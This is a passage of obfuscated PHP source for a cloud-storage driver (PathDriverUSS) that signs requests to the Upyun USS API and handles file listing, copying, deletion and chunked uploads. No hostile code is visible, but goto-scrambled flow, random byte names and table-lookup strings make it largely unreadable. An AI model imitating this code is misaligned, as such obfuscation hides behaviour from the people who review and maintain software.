$BƒÔ­˜—[309]) { $d ë¤Í¿[$BƒÔ­˜—[1595]] = $BƒÔ­˜—[106]; } $this->update(); } public function copyFileEnd($e÷±óÖ‘È, $eœ×Ê¶ÍùÒ, $BÔäñŸÕó, $EÉÜìŸõÂÈ, $A³…ì®¬Ÿİ, $E²¡Ì¶ÊŸÌ) { $eçÍÇâŠ =& $_SERVER[ÉóçÄÇ]; $e§ÚèÂÑ»Œ =& $this->task; $e§ÚèÂÑ»Œ[$eçÍÇâŠ[1555]] = $e§ÚèÂÑ»Œ[$eçÍÇâŠ[1554]]; $e§ÚèÂÑ»Œ[$eçÍÇâŠ[1559]] += $e§ÚèÂÑ»Œ[$eçÍÇâŠ[1554]]; $e§ÚèÂÑ»Œ[$eçÍÇâŠ[1556]] = $eçÍÇâŠ[33]; $this->update(); } public function nameParse($A„í×ˆ¹Š†) { $a¯‰Ò£ =& $_SERVER[ÉóçÄÇ]; $e†ö÷ÍÏ´’ =& $this->task; if ($e†ö÷ÍÏ´’[$a¯‰Ò£[1018]] < $e†ö÷ÍÏ´’[$a¯‰Ò£[1004]]) { $B¤¨îŒ•Ôå = get_path_this($A„í×ˆ¹Š†); if (strstr($B¤¨îŒ•Ôå, $a¯‰Ò£[94])) { $e†ö÷ÍÏ´’[$a¯‰Ò£[1018]] += 1; } } if ($e†ö÷ÍÏ´’[$a¯‰Ò£[1595]] == $a¯‰Ò£[1076]) { $e†ö÷ÍÏ´’[$a¯‰Ò£[1595]] = $a¯‰Ò£[309]; } $e†ö÷ÍÏ´’[$a¯‰Ò£[1552]] = $A„í×ˆ¹Š†; $this->update(); } } goto Dšà‚š™ã; AíªËñ½¬æ: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\160\72\x2f\x2f\x76\60\x2e\141\160\151\56\165\160\x79\x75\156\56\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($B³±¸êôµ) { parent::__construct(); $this->_init($B³±¸êôµ); } public function _init($E¬Ê® áÚ‡) { $b‚öö÷™Şò =& $_SERVER[ÉóçÄÇ]; foreach ($E¬Ê® áÚ‡ as $B“Æ‘Ê²ƒª => $B’’¶†Á­”) { if (isset($this->{$B“Æ‘Ê²ƒª})) { $this->{$B“Æ‘Ê²ƒª} = $B’’¶†Á­”; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($b‚öö÷™Şò[1311] . LNG($b‚öö÷™Şò[1242])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($C³Éµ–˜ã‚, $AÉæĞß²’É = "\x47\x45\x54") { $cêŠ’Ö¤Ò¯ =& $_SERVER[ÉóçÄÇ]; $CÏíéÇÍ­™ = gmdate($cêŠ’Ö¤Ò¯[1276]); $FÈ•ÒõÀÍå = base64_encode(hash_hmac($cêŠ’Ö¤Ò¯[1312], "{$AÉæĞß²’É}\46{$C³Éµ–˜ã‚}\x26{$CÏíéÇÍ­™}", md5("{$this->userpass}"), !0)); $c‡‰²âôå = array("\101\x75\164\150\x6f\162\x69\172\141\x74\x69\x6f\x6e\x3a\x55\120\x59\125\x4e\x20{$this->username}\72{$FÈ•ÒõÀÍå}", "\x44\141\x74\145\x3a{$CÏíéÇÍ­™}"); return $c‡‰²âôå; } public function ussRequest($fÜ¯¶Ã×Œä, $EÊ¦´‘Â¥ = "\x47\105\124", $b½ÙæÈó—Å = false, $FŠä’°õÏæ = false, $C»İæ†¸ = false) { goto A¬²ô‚; A¬²ô‚: $aÆé×äŠâ¿ =& $_SERVER[ÉóçÄÇ]; $fÜ¯¶Ã×Œä = trim($fÜ¯¶Ã×Œä, $aÆé×äŠâ¿[8]); $d®ë‡—ÙŸ = "\57{$this->bucket}\x2f{$fÜ¯¶Ã×Œä}"; goto b«Ò´àªÆ; b»Ä‘†åî: if (!$cŒì•åæ) { return array($aÆé×äŠâ¿[1068] => !1, $aÆé×äŠâ¿[1070] => $aÆé×äŠâ¿[1313]); } if (strtolower($EÊ¦´‘Â¥) == $aÆé×äŠâ¿[190] || in_array($cŒì•åæ[$aÆé×äŠâ¿[1068]], array($aÆé×äŠâ¿[1169], $aÆé×äŠâ¿[1314]))) { $b½ÙæÈó—Å = $cŒì•åæ[$aÆé×äŠâ¿[1315]]; } else { $b½ÙæÈó—Å = json_decode($cŒì•åæ[$aÆé×äŠâ¿[1070]], !0); if (!$b½ÙæÈó—Å) { $b½ÙæÈó—Å = $cŒì•åæ[$aÆé×äŠâ¿[1070]]; } else { if (!$cŒì•åæ[$aÆé×äŠâ¿[711]] && isset($b½ÙæÈó—Å[$aÆé×äŠâ¿[1316]])) { $b½ÙæÈó—Å = $b½ÙæÈó—Å[$aÆé×äŠâ¿[1316]]; } } } return array($aÆé×äŠâ¿[1068] => $cŒì•åæ[$aÆé×äŠâ¿[711]], $aÆé×äŠâ¿[1070] => $b½ÙæÈó—Å); goto eãèç„ÑÊ; b«Ò´àªÆ: $Bó‡˜è»İ = $this->ussHeaders($d®ë‡—ÙŸ, $EÊ¦´‘Â¥); if ($FŠä’°õÏæ) { $Bó‡˜è»İ = array_merge($Bó‡˜è»İ, $FŠä’°õÏæ); } $cŒì•åæ = url_request($this->endpoint . $d®ë‡—ÙŸ, $EÊ¦´‘Â¥, $b½ÙæÈó—Å, $Bó‡˜è»İ, $C»İæ†¸); goto b»Ä‘†åî; eãèç„ÑÊ: } public function mkfile($CÌŸ¢ÓŠç¼, $F‡Éî»Ï¨ê = '', $Dô®õÚ„º† = REPEAT_RENAME) { if ($this->setContent($CÌŸ¢ÓŠç¼, $F‡Éî»Ï¨ê)) { return $this->getPathOuter($CÌŸ¢ÓŠç¼); } return !1; } public function mkdir($bÅƒÉÙÜ», $D„›ÑâË = REPEAT_SKIP) { $Bˆ²Ú·ß¥¥ =& $_SERVER[ÉóçÄÇ]; $dô†‰à»­ = trim($bÅƒÉÙÜ», $Bˆ²Ú·ß¥¥[8]); if ($this->_isFolder($dô†‰à»­)) { return $this->getPathOuter($dô†‰à»­); } $FÙåƒ®ã˜… = array($Bˆ²Ú·ß¥¥[1317]); $Dâ–—£Ä± = $this->ussRequest($dô†‰à»­, $Bˆ²Ú·ß¥¥[222], !1, $FÙåƒ®ã˜…); return $Dâ–—£Ä±[$Bˆ²Ú·ß¥¥[1068]] ? $this->getPathOuter($dô†‰à»­) : !1; } public function copyFile($aáÜÃ¦Ñ´Æ, $dŒÃ†”ê†¿) { $d°±¬ì¯— =& $_SERVER[ÉóçÄÇ]; $EõÚÎ×ªâ = array($d°±¬ì¯—[1318] . "\x2f{$this->bucket}\x2f{$aáÜÃ¦Ñ´Æ}", $d°±¬ì¯—[1319]); $Bë¹Ù”©¸Ø = $this->ussRequest($dŒÃ†”ê†¿, $d°±¬ì¯—[224], !1, $EõÚÎ×ªâ); return $Bë¹Ù”©¸Ø[$d°±¬ì¯—[1068]] ? !0 : $this->getPathOuter($dŒÃ†”ê†¿); } public function moveFile($F½”™¤Õ©‡, $D…’‡×ÄŸ) { $aµé…‹¤–é =& $_SERVER[ÉóçÄÇ]; $bµ„Ø‘æÜ– = array($aµé…‹¤–é[1320] . "\x2f{$this->bucket}\x2f{$F½”™¤Õ©‡}", $aµé…‹¤–é[1319]); $bÆƒÕÆ©Õ = $this->ussRequest($D…’‡×ÄŸ, $aµé…‹¤–é[224], !1, $bµ„Ø‘æÜ–); return $bÆƒÕÆ©Õ[$aµé…‹¤–é[1068]] ? !0 : $this->getPathOuter($D…’‡×ÄŸ); } public function delFile($bˆÉ¯¡Ø–²) { $e¿Ší„Äİ =& $_SERVER[ÉóçÄÇ]; $bÛÈİ¡‘ = $this->ussRequest($bˆÉ¯¡Ø–², $e¿Ší„Äİ[1321]); return $bÛÈİ¡‘[$e¿Ší„Äİ[1068]] ? !0 : !1; } public function delFolder($CĞ²¬Ää˜) { goto CŞà‘Ïåôå; EÜßĞÂ¦²: return $b”Ü§ß‘µÓ[$E·î·ÎŸ’ß[1068]]; goto eÔ°¾ØÚ±Ï; CŞà‘Ïåôå: $E·î·ÎŸ’ß =& $_SERVER[ÉóçÄÇ]; if (!$this->exist($CĞ²¬Ää˜)) { return !0; } $this->listItemCache = !1; goto b¹‘®ì²Æ; b²Š†¹ĞÀë: foreach ($e÷À¸¨òĞ as $Fßê¢ßÄù÷) { $b”Ü§ß‘µÓ = $this->ussRequest($Fßê¢ßÄù÷[$E·î·ÎŸ’ß[28]], $E·î·ÎŸ’ß[1321]); if (!$b”Ü§ß‘µÓ[$E·î·ÎŸ’ß[1068]]) { return !1; } } foreach ($eá¾÷„á“® as $F«‘ÍÓ°«‰) { $b”Ü§ß‘µÓ = $this->ussRequest($F«‘ÍÓ°«‰, $E·î·ÎŸ’ß[1321]); if (!$b”Ü§ß‘µÓ[$E·î·ÎŸ’ß[1068]]) { return !1; } } $b”Ü§ß‘µÓ = $this->ussRequest($CĞ²¬Ää˜, $E·î·ÎŸ’ß[1321]); goto EÜßĞÂ¦²; b¹‘®ì²Æ: $eá¾÷„á“® = $e÷À¸¨òĞ = array(); $this->fileList($CĞ²¬Ää˜, $eá¾÷„á“®, $e÷À¸¨òĞ, !0); $this->listItemCache = !0; goto b²Š†¹ĞÀë; eÔ°¾ØÚ±Ï: } public function rename($bĞäÊï˜Æ¯, $Aôè¼ç™—Å) { if ($this->isFile($bĞäÊï˜Æ¯)) { $Aôè¼ç™—Å = get_path_father($bĞäÊï˜Æ¯) . $Aôè¼ç™—Å; return $this->moveFile($bĞäÊï˜Æ¯, $Aôè¼ç™—Å); } return $this->renameObject($bĞäÊï˜Æ¯, $Aôè¼ç™—Å); } public function fileInfo($d•ñ¨¤Çº, $a¶Ï®“Êİ¯ = false, $Bõøƒö¦ÉÃ = array()) { goto a‹Êò–˜Œ¢; A‚§—˜¼: $b†¬ØŠ›ÔÃ[$a•ÅŞğ«‚¶[192]] = intval($Bõøƒö¦ÉÃ[$a•ÅŞğ«‚¶[1322]]); $b†¬ØŠ›ÔÃ[$a•ÅŞğ«‚¶[83]] = intval($Bõøƒö¦ÉÃ[$a•ÅŞğ«‚¶[1323]]); $b†¬ØŠ›ÔÃ[$a•ÅŞğ«‚¶[77]] = $Bõøƒö¦ÉÃ[$a•ÅŞğ«‚¶[77]]; goto dâŸ½”Í œ; a‹Êò–˜Œ¢: $a•ÅŞğ«‚¶ =& $_SERVER[ÉóçÄÇ]; $b†¬ØŠ›ÔÃ = array($a•ÅŞğ«‚¶[28] => $this->pathThis($d•ñ¨¤Çº), $a•ÅŞğ«‚¶[75] => $this->getPathOuter($a•ÅŞğ«‚¶[8] . $d•ñ¨¤Çº), $a•ÅŞğ«‚¶[29] => $a•ÅŞğ«‚¶[173], $a•ÅŞğ«‚¶[77] => isset($Bõøƒö¦ÉÃ[$a•ÅŞğ«‚¶[77]]) ? $Bõøƒö¦ÉÃ[$a•ÅŞğ«‚¶[77]] : 0, $a•ÅŞğ«‚¶[167] => $this->ext($d•ñ¨¤Çº)); if ($a¶Ï®“Êİ¯) { return $b†¬ØŠ›ÔÃ; } goto C–âÒçã‹Ö; C–âÒçã‹Ö: $b†¬ØŠ›ÔÃ[$a•ÅŞğ«‚¶[192]] = $b†¬ØŠ›ÔÃ[$a•ÅŞğ«‚¶[83]] = 0; $b†¬ØŠ›ÔÃ[$a•ÅŞğ«‚¶[193]] = $b†¬ØŠ›ÔÃ[$a•ÅŞğ«‚¶[194]] = !0; if (empty($Bõøƒö¦ÉÃ)) { $Bõøƒö¦ÉÃ = $this->objectMeta($d•ñ¨¤Çº); if (!$Bõøƒö¦ÉÃ) { return $b†¬ØŠ›ÔÃ; } } goto A‚§—˜¼; dâŸ½”Í œ: return $b†¬ØŠ›ÔÃ; goto cµ„Ó···ß; cµ„Ó···ß: } public function folderInfo($AÂ¢‡ãŒã•, $fÊ¨…İõÍ¦ = false) { goto FÜ‡Àù¯îˆ; eóÆ•¾¼¹¸: $aÇÑ¦…§Ğ¿[$CåŒš¥Œİ’[192]] = intval($a£Ç¶Ÿé­Œ[$CåŒš¥Œİ’[1322]]); $aÇÑ¦…§Ğ¿[$CåŒš¥Œİ’[83]] = intval($a£Ç¶Ÿé­Œ[$CåŒš¥Œİ’[1323]]); return $aÇÑ¦…§Ğ¿; goto EÍ Š‘ëé»; FÜ‡Àù¯îˆ: $CåŒš¥Œİ’ =& $_SERVER[ÉóçÄÇ]; $aÇÑ¦…§Ğ¿ = array($CåŒš¥Œİ’[28] => $this->pathThis($AÂ¢‡ãŒã•), $CåŒš¥Œİ’[75] => $this->getPathOuter($CåŒš¥Œİ’[8] . $AÂ¢‡ãŒã•), $CåŒš¥Œİ’[29] => $CåŒš¥Œİ’[76]); if ($fÊ¨…İõÍ¦) { return $aÇÑ¦…§Ğ¿; } goto F®´÷µ²èˆ; F®´÷µ²èˆ: $aÇÑ¦…§Ğ¿[$CåŒš¥Œİ’[192]] = $aÇÑ¦…§Ğ¿[$CåŒš¥Œİ’[83]] = 0; $aÇÑ¦…§Ğ¿[$CåŒš¥Œİ’[193]] = $aÇÑ¦…§Ğ¿[$CåŒš¥Œİ’[194]] = !0; if (empty($a£Ç¶Ÿé­Œ)) { $a£Ç¶Ÿé­Œ = $this->objectMeta($AÂ¢‡ãŒã•); if (!$a£Ç¶Ÿé­Œ) { return $aÇÑ¦…§Ğ¿; } } goto eóÆ•¾¼¹¸; EÍ Š‘ëé»: } private function listObjs($bà§ˆ¥òùÓ, $Cè­åŠÍ = 0, $a±ÎÑ¬Òˆ¶ = 1000) { $bÛ˜ã’‚Š =& $_SERVER[ÉóçÄÇ]; $açÁßò‡ = array($bÛ˜ã’‚Š[1324], $bÛ˜ã’‚Š[1325] . $a±ÎÑ¬Òˆ¶); if ($Cè­åŠÍ) { $açÁßò‡[] = $bÛ˜ã’‚Š[1326] . $Cè­åŠÍ; } $e´Ü†˜ØÈÍ = $this->ussRequest($bà§ˆ¥òùÓ, $bÛ˜ã’‚Š[226], !1, $açÁßò‡); return !$e´Ü†˜ØÈÍ[$bÛ˜ã’‚Š[1068]] ? !1 : $e´Ü†˜ØÈÍ[$bÛ˜ã’‚Š[1070]]; } private function fileList($AŒêã×´Â, &$AÀãß ®¤¾, &$cÉäëáÒŒÚ, $A‚Æ¨„º’ = false) { goto Cçóèâ¸Š‰; BÕÙ¥÷ğÄÂ: if ($DÇí…ÙÅ®) { $this->cacheMethod($fÀ—´¹çĞ[197], $AŒêã×´Â, !0); } goto D±ò‚‘Áò‚; Cçóèâ¸Š‰: $fÀ—´¹çĞ =& $_SERVER[ÉóçÄÇ]; $E‚à‘¢‰– = $fÀ—´¹çĞ[33]; $B…çùïÜŸë = 1000; goto C¥Ú¨Š”Ú; C¥Ú¨Š”Ú: $a²ŞÇÉš = rtrim($AŒêã×´Â, $fÀ—´¹çĞ[8]) . $fÀ—´¹çĞ[8]; $DÇí…ÙÅ® = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $E­ÉŞğ– = $this->listObjs($AŒêã×´Â, $E‚à‘¢‰–, $B…çùïÜŸë); if (!$E­ÉŞğ–) { return !1; } $E‚à‘¢‰– = isset($E­ÉŞğ–[$fÀ—´¹çĞ[1327]]) ? $E­ÉŞğ–[$fÀ—´¹çĞ[1327]] : $fÀ—´¹çĞ[33]; $eËÉ…¾¸‘ = isset($E­ÉŞğ–[$fÀ—´¹çĞ[1328]]) ? $E­ÉŞğ–[$fÀ—´¹çĞ[1328]] : array(); foreach ($eËÉ…¾¸‘ as $Fñì…ğ¯õ´) { $BÌÂ÷©‡Ş‘ = $Fñì…ğ¯õ´[$fÀ—´¹çĞ[29]] == $fÀ—´¹çĞ[76] ? !0 : !1; $D´°¢Ö†ÃÁ = ltrim($a²ŞÇÉš . $Fñì…ğ¯õ´[$fÀ—´¹çĞ[28]], $fÀ—´¹çĞ[8]) . ($BÌÂ÷©‡Ş‘ ? $fÀ—´¹çĞ[8] : $fÀ—´¹çĞ[33]); $dô‹Ã½ïÜª = array($fÀ—´¹çĞ[28] => $D´°¢Ö†ÃÁ, $fÀ—´¹çĞ[29] => $BÌÂ÷©‡Ş‘ ? $fÀ—´¹çĞ[76] : $fÀ—´¹çĞ[173], $fÀ—´¹çĞ[77] => $Fñì…ğ¯õ´[$fÀ—´¹çĞ[333]], $fÀ—´¹çĞ[1323] => $Fñì…ğ¯õ´[$fÀ—´¹çĞ[1329]]); if ($DÇí…ÙÅ®) { $this->cacheMethod($fÀ—´¹çĞ[197], $D´°¢Ö†ÃÁ, $BÌÂ÷©‡Ş‘); $this->cacheMethod($fÀ—´¹çĞ[198], $D´°¢Ö†ÃÁ, $dô‹Ã½ïÜª); } if ($BÌÂ÷©‡Ş‘) { $AÀãß ®¤¾[] = $D´°¢Ö†ÃÁ; if ($A‚Æ¨„º’) { $this->fileList($D´°¢Ö†ÃÁ, $AÀãß ®¤¾, $cÉäëáÒŒÚ, $A‚Æ¨„º’); } continue; } $cÉäëáÒŒÚ[] = $dô‹Ã½ïÜª; } if (count($eËÉ…¾¸‘) < $B…çùïÜŸë) { break; } } goto BÕÙ¥÷ğÄÂ; D±ò‚‘Áò‚: } public function listPath($eë¤¦ëğê³, $eÑíë¸Âˆ… = false) { $FÖ‚«ŠÕµ =& $_SERVER[ÉóçÄÇ]; $dÊ¦ª²Óµ™ = $EÂ‘§ÈÆ‡… = array(); $this->fileList($eë¤¦ëğê³, $dÊ¦ª²Óµ™, $EÂ‘§ÈÆ‡…); foreach ($dÊ¦ª²Óµ™ as $EÄƒ­ŸõØ => $E†¦Õ¹³å) { $dÊ¦ª²Óµ™[$EÄƒ­ŸõØ] = $this->folderInfo($E†¦Õ¹³å, $eÑíë¸Âˆ…); } foreach ($EÂ‘§ÈÆ‡… as $EÄƒ­ŸõØ => $E†¦Õ¹³å) { $EÂ‘§ÈÆ‡…[$EÄƒ­ŸõØ] = $this->fileInfo($E†¦Õ¹³å[$FÖ‚«ŠÕµ[28]], $eÑíë¸Âˆ…, $E†¦Õ¹³å); } return array($FÖ‚«ŠÕµ[74] => $dÊ¦ª²Óµ™, $FÖ‚«ŠÕµ[73] => $EÂ‘§ÈÆ‡…); } public function has($Cåïæ‚‰£ß, $C®í— ¥× = false, $bÃ‡ƒåÛ‚ = true) { goto FÑËš‚‹ë; DÔÎá”»: while (!0) { check_abort(); $DçŒ¦æëº‚ = $this->listObjs($Cåïæ‚‰£ß, $dÕ—‰É•¯, $DíÂî‰—Ãá); if (!$DçŒ¦æëº‚) { return !1; } $dÕ—‰É•¯ = isset($DçŒ¦æëº‚[$A©¡’Ñ­ÌÆ[1327]]) ? $DçŒ¦æëº‚[$A©¡’Ñ­ÌÆ[1327]] : $A©¡’Ñ­ÌÆ[33]; $d†Â„ËŠèƒ = isset($DçŒ¦æëº‚[$A©¡’Ñ­ÌÆ[1328]]) ? $DçŒ¦æëº‚[$A©¡’Ñ­ÌÆ[1328]] : array(); if (empty($d†Â„ËŠèƒ)) { break; } $C¥åÃçÀÁ = array_filter($d†Â„ËŠèƒ, function ($Dãš¤ñÀĞ) { $AĞ†ì™¶§ =& $_SERVER[ÉóçÄÇ]; return $Dãš¤ñÀĞ[$AĞ†ì™¶§[29]] == $AĞ†ì™¶§[76]; }); $Bğ”»¯Šíª = count($d†Â„ËŠèƒ); $C¥åÃçÀÁ = count($C¥åÃçÀÁ); $e‘¬‚’ÖÏ = $Bğ”»¯Šíª - $C¥åÃçÀÁ; if ($C®í— ¥×) { $b­íÆ÷÷¹ += $C¥åÃçÀÁ; $eÑõï¶äòÂ += $e‘¬‚’ÖÏ; if ($Bğ”»¯Šíª < $DíÂî‰—Ãá) { break; } continue; } if ($bÃ‡ƒåÛ‚) { if ($e‘¬‚’ÖÏ) { return !0; } } else { if ($C¥åÃçÀÁ) { return !0; } } if ($Bğ”»¯Šíª < $DíÂî‰—Ãá) { break; } } if ($C®í— ¥×) { return array($A©¡’Ñ­ÌÆ[201] => $eÑõï¶äòÂ, $A©¡’Ñ­ÌÆ[202] => $b­íÆ÷÷¹); } return !1; goto b•áÙËËæ‘; aÜì«êŒµÕ: $eÑõï¶äòÂ = 0; $b­íÆ÷÷¹ = 0; $EË‡ŞˆÁ¿Õ = rtrim($Cåïæ‚‰£ß, $A©¡’Ñ­ÌÆ[8]) . $A©¡’Ñ­ÌÆ[8]; goto DÔÎá”»; FÑËš‚‹ë: $A©¡’Ñ­ÌÆ =& $_SERVER[ÉóçÄÇ]; $dÕ—‰É•¯ = $A©¡’Ñ­ÌÆ[33]; $DíÂî‰—Ãá = 500; goto aÜì«êŒµÕ; b•áÙËËæ‘: } public function listAll($aÕÎİè’®) { goto a¬İİ˜ä×Ë; a¬İİ˜ä×Ë: $EˆŠ­§ùæ¯ =& $_SERVER[ÉóçÄÇ]; $Aµ®’¸˜ = $D¬ÕØ³‹šŠ = array(); $this->fileList($aÕÎİè’®, $Aµ®’¸˜, $D¬ÕØ³‹šŠ, !0); goto b¢™±ÙÒñ›; f£ÆÕ¤„ó´: return $this->listAllFiles($aÕÎİè’®, array_keys($F¸Ú©ìÚåÚ), $F¸Ú©ìÚåÚ); goto Bâ÷©…ÖŒê; b¢™±ÙÒñ›: $F¸Ú©ìÚåÚ = array(); foreach ($D¬ÕØ³‹šŠ as $DÙ‚õ¬£Ó) { $F¸Ú©ìÚåÚ[$DÙ‚õ¬£Ó[$EˆŠ­§ùæ¯[28]]] = $DÙ‚õ¬£Ó[$EˆŠ­§ùæ¯[77]]; } foreach ($Aµ®’¸˜ as $DÙ‚õ¬£Ó) { if (is_string($DÙ‚õ¬£Ó)) { $F¸Ú©ìÚåÚ[$DÙ‚õ¬£Ó] = 0; } } goto f£ÆÕ¤„ó´; Bâ÷©…ÖŒê: } public function canRead($E«»çÅ«İÖ) { return $this->exist($E«»çÅ«İÖ) ? !0 : !1; } public function canWrite($C•”÷í˜„é) { return $this->exist($C•”÷í˜„é) ? !0 : !1; } public function getContent($EêÕÌœÆ´É) { return $this->fileSubstr($EêÕÌœÆ´É, 0, -1); } public function setContent($BÁá‡ƒñÛƒ, $f–Ïì°ÜŠ… = '') { $CÍğõ¨÷Ïó =& $_SERVER[ÉóçÄÇ]; if (!$f–Ïì°ÜŠ…) { $FÒÊ™™ÄØ¶ = $this->ussRequest($BÁá‡ƒñÛƒ, $CÍğõ¨÷Ïó[222]); return $FÒÊ™™ÄØ¶[$CÍğõ¨÷Ïó[1068]]; } $D•„É—óÖŒ = $this->tempFile($this->pathThis($BÁá‡ƒñÛƒ)); file_put_contents($D•„É—óÖŒ, $f–Ïì°ÜŠ…); if ($this->upload($BÁá‡ƒñÛƒ, $D•„É—óÖŒ)) { $this->tempFileRemve($D•„É—óÖŒ); return !0; } return !1; } public function fileSubstr($F“¥»»†’, $CÜ›ÀÚòœì, $d·éë‘Äò) { $f¯¤ç‹ÌŠ¢ =& $_SERVER[ÉóçÄÇ]; if (!($FöÚ‰§¸‰ = $this->link($F“¥»»†’))) { return !1; } $C®Š‡š÷Ï¾ = !1; if ($d·éë‘Äò > 0) { $eãó¸ñ¹Ğ¡ = $CÜ›ÀÚòœì + $d·éë‘Äò - 1; $C®Š‡š÷Ï¾ = array($f¯¤ç‹ÌŠ¢[1289] . $CÜ›ÀÚòœì . $f¯¤ç‹ÌŠ¢[434] . $eãó¸ñ¹Ğ¡); } $bˆ´Ù¹¾›¶ = url_request($FöÚ‰§¸‰, $f¯¤ç‹ÌŠ¢[226], !1, $C®Š‡š÷Ï¾); return $bˆ´Ù¹¾›¶[$f¯¤ç‹ÌŠ¢[711]] ? $bˆ´Ù¹¾›¶[$f¯¤ç‹ÌŠ¢[1070]] : !1; } public function upload($DšÂÕÇ‡èî, $Eòì£·Ö»ç, $F„Ì¦’ŞçÓ = false, $dâÏŒÂ™¼ = REPEAT_REPLACE) { goto FòÂÛ¥„ƒ‹; d…¨å›”®Ô: $EõŒœĞ…†÷ = 1024 * 1024 * 10; $CÕâÔ”‚§ = array($C¢×Îß›È[1331], $C¢×Îß›È[1332] . $d“Ãõğ¤ïÓ, $C¢×Îß›È[1333], $C¢×Îß›È[1334] . $EõŒœĞ…†÷); $A‚òĞ¢ÃÊé = $this->ussRequest($DšÂÕÇ‡èî, $C¢×Îß›È[224], !1, $CÕâÔ”‚§); goto Aî‘¦ÄØ­; aÉ³è•íÓ: do { $FàÜÖ–ÙØ = $e‹ãšğ•©Œ[$C¢×Îß›È[1336]]; fseek_64($Aí†±İé§Í, $dƒÅ¼§ÊĞ¢); $dàƒö³œÕ = fread($Aí†±İé§Í, $FàÜÖ–ÙØ); $A­‡•à  = 0; do { $A­‡•à ++; $e‹ãšğ•©Œ = $this->uploadPart($DšÂÕÇ‡èî, $e‹ãšğ•©Œ, $dàƒö³œÕ); } while (!$e‹ãšğ•©Œ && $A­‡•à  < 3); if (!$e‹ãšğ•©Œ) { return !1; } $FÇç©Àãà = $e‹ãšğ•©Œ[$C¢×Îß›È[1335]]; $dƒÅ¼§ÊĞ¢ += $FàÜÖ–ÙØ; } while ($FÇç©Àãà != -1); fclose($Aí†±İé§Í); $CÕâÔ”‚§ = array($C¢×Îß›È[1337], $C¢×Îß›È[1338] . $e‹ãšğ•©Œ[$C¢×Îß›È[1339]], $C¢×Îß›È[1333]); goto cÀš‚ö¹°•; cÀš‚ö¹°•: $A‚òĞ¢ÃÊé = $this->ussRequest($DšÂÕÇ‡èî, $C¢×Îß›È[224], !1, $CÕâÔ”‚§); return $A‚òĞ¢ÃÊé[$C¢×Îß›È[1068]] ? $this->getPathOuter($B‡¦ğÑã³í) : !1; goto fï¡ùŠ„‡À; Aî‘¦ÄØ­: if (!$A‚òĞ¢ÃÊé[$C¢×Îß›È[1068]]) { return !1; } $e‹ãšğ•©Œ = $A‚òĞ¢ÃÊé[$C¢×Îß›È[1070]]; $dƒÅ¼§ÊĞ¢ = 0; goto B³õíñ„í; FòÂÛ¥„ƒ‹: $C¢×Îß›È =& $_SERVER[ÉóçÄÇ]; $d“Ãõğ¤ïÓ = IO::size($Eòì£·Ö»ç); if ($d“Ãõğ¤ïÓ <= 1024 * 1024 * 200) { $B…½á—çç = array($C¢×Îß›È[1330] . $Eòì£·Ö»ç); $A‚òĞ¢ÃÊé = $this->ussRequest($DšÂÕÇ‡èî, $C¢×Îß›È[224], $B…½á—çç); return $A‚òĞ¢ÃÊé[$C¢×Îß›È[1068]] ? $this->getPathOuter($DšÂÕÇ‡èî) : !1; } goto d…¨å›”®Ô; B³õíñ„í: $FÇç©Àãà = $e‹ãšğ•©Œ[$C¢×Îß›È[1335]]; $Aí†±İé§Í = fopen($Eòì£·Ö»ç, $C¢×Îß›È[1239]); if (!$Aí†±İé§Í) { return !1; } goto aÉ³è•íÓ; fï¡ùŠ„‡À: } private function uploadPart($E–¸Íçâİ, $f­ÌìÊ­îõ, &$fáª‹»ç•‰) { $f¬ƒñ›­¸„ =& $_SERVER[ÉóçÄÇ]; $DÀ¾‡¼÷Úô = array($f¬ƒñ›­¸„[1340], $f¬ƒñ›­¸„[1338] . $f­ÌìÊ­îõ[$f¬ƒñ›­¸„[1339]], $f¬ƒñ›­¸„[1341] . $f­ÌìÊ­îõ[$f¬ƒñ›­¸„[1335]], $f¬ƒñ›­¸„[140] . $f­ÌìÊ­îõ[$f¬ƒñ›­¸„[1336]]); $Fåâ§¹Éƒ = $this->ussRequest($E–¸Íçâİ, $f¬ƒñ›­¸„[224], $fáª‹»ç•‰, $DÀ¾‡¼÷Úô); return !$Fåâ§¹Éƒ[$f¬ƒñ›­¸„[1068]] ? $Fåâ§¹Éƒ[$f¬ƒñ›­¸„[1068]] : $Fåâ§¹Éƒ[$f¬ƒñ›­¸„[1070]]; } public function uploadFormData($c¤¿™ˆÚô„, $E£¥’Ã†æÍ = 3600) { return $this->uploadPolicy($c¤¿™ˆÚô„, $E£¥’Ã†æÍ); } public function multiUploadFormData($BêğÍ„‡Š‡, $b·„åˆœ‰Š = 3600) { $DñÄ‰²Š‡ =& $_SERVER[ÉóçÄÇ]; $c±µŞ»È‘ = (int) $GLOBALS[$DñÄ‰²Š‡[7]][$DñÄ‰²Š‡[77]]; return $this->uploadPolicy($BêğÍ„‡Š‡, $b·„åˆœ‰Š, $c±µŞ»È‘); } private function uploadPolicy($F”í½ˆØÓ¡, $aì©®•¯­‚ = 3600, $DµÀ©‹§õ¥ = 0) { goto a«‰±ä¬ÛĞ; a«‰±ä¬ÛĞ: $D——™´²Å« =& $_SERVER[ÉóçÄÇ]; $A‡‰âÅğ¾ = $D——™´²Å«[8] . $this->bucket; $FÑìÁ³¾Èˆ = gmdate($D——™´²Å«[1276]); goto Eàª„ïİì‘; Eàª„ïİì‘: $cË«¼²…Ò = array($D——™´²Å«[1342] => $this->bucket, $D——™´²Å«[1343] => $F”í½ˆØÓ¡, $D——™´²Å«[1344] => time() + $aì©®•¯­‚, $D——™´²Å«[1345] => $FÑìÁ³¾Èˆ); if ($DµÀ©‹§õ¥) { $cË«¼²…Ò[$D——™´²Å«[1255]] = $DµÀ©‹§õ¥; } $b”¡Ä˜ˆÄÌ = base64_encode(json_encode($cË«¼²…Ò)); goto DäØÛğ¼º´; DäØÛğ¼º´: $F¦¨ÂŞÒã = base64_encode(hash_hmac($D——™´²Å«[1312], "\120\x4f\123\x54\46{$A‡‰âÅğ¾}\x26{$FÑìÁ³¾Èˆ}\46{$b”¡Ä˜ˆÄÌ}", md5("{$this->userpass}"), !0)); $BÆÒµÂ  = array($D——™´²Å«[1181] => $b”¡Ä˜ˆÄÌ, $D——™´²Å«[1346] => "\x55\x50\131\x55\116\40{$this->username}\x3a{$F¦¨ÂŞÒã}", 